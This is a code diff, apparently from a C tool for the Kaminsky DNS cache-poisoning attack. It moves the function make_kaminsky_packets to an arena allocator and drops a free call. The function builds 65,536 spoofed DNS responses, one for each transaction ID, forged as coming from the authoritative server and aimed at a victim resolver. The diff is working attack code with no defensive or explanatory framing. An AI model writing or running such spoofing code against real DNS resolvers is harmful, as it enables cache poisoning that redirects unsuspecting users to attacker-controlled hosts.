@@ -163,7 +163,7 @@ static void free_make_spoof_args(void* args) {
  * @brief The core packet generation function, used by each multitask work item.
  * It creates 65536 spoofed DNS responses for a specific random domain.
  */
-bool make_kaminsky_packets(packet_queue_t* queue, void* args) {
+bool make_kaminsky_packets(Arena* arena, packet_queue_t* queue, void* args) {
     make_spoof_args_t* s_args = (make_spoof_args_t*)args;
 
     // 1. Construct the DNS payload template
@@ -183,7 +183,7 @@ bool make_kaminsky_packets(packet_queue_t* queue, void* args) {
                                      additional, 1,      // 1 Additional RR
                                      FALSE);
 
-    uint8_t* packet_template = (uint8_t*)alloc_memory(DNS_PKT_MAX_LEN);
+    uint8_t* packet_template = (uint8_t*)arena_alloc(arena, DNS_PKT_MAX_LEN);
     size_t packet_raw_len = make_udp_packet(packet_template, DNS_PKT_MAX_LEN,
                                             inet_addr(s_args->auth_ip),
                                             inet_addr(s_args->victim_ip),
@@ -210,8 +210,8 @@ bool make_kaminsky_packets(packet_queue_t* queue, void* args) {
 
     // 2. Generate 65536 packets, each with a different TXID
     for (uint32_t i = 0; i <= UINT16_MAX; i++) {
-        packet_t* new_pkt = (packet_t*)alloc_memory(sizeof(packet_t));
-        new_pkt->data = (uint8_t*)alloc_memory(packet_raw_len);
+        packet_t* new_pkt = (packet_t*)arena_alloc(arena, sizeof(packet_t));
+        new_pkt->data = (uint8_t*)arena_alloc(arena, packet_raw_len);
         new_pkt->size = packet_raw_len;
         new_pkt->next = NULL;
         memcpy(&new_pkt->dest_addr, &dest_addr_template, sizeof(dest_addr_template));
@@ -222,8 +222,6 @@ bool make_kaminsky_packets(packet_queue_t* queue, void* args) {
         if (queue->head == NULL) { queue->head = new_pkt; queue->tail = new_pkt; } 
         else { queue->tail->next = new_pkt; queue->tail = new_pkt; }
     }
-    
-    free(packet_template);
     return true;
 }
 
